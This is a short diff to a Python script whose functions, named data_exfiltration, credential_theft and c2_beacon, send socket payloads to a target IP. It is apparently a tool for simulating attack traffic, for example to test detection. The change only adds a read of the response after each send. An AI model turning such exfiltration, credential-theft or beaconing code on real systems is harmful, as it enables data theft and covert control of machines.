@@ -86,6 +86,8 @@ def data_exfiltration(target_ip, target_port):
             headers = f"POST /upload HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: {len(payload)}\r\n\r\n".encode()
             
             s.sendall(headers + payload)
+            try: s.recv(1024)
+            except: pass
             s.close()
             time.sleep(0.5)
         print("[+] Exfiltration complete!")
@@ -160,6 +162,8 @@ def credential_theft(target_ip, target_port=5000):
             s.settimeout(1)
             s.connect((target_ip, target_port))
             s.send(payload)
+            try: s.recv(1024)
+            except: pass
             s.close()
             time.sleep(0.5)
         print("[+] Credential theft simulation complete.")
@@ -175,6 +179,8 @@ def c2_beacon(target_ip, target_port=5000):
             s.settimeout(1)
             s.connect((target_ip, target_port))
             s.send(payload)
+            try: s.recv(1024)
+            except: pass
             s.close()
             time.sleep(1)
         print("[+] C2 Beaconing simulation complete.")
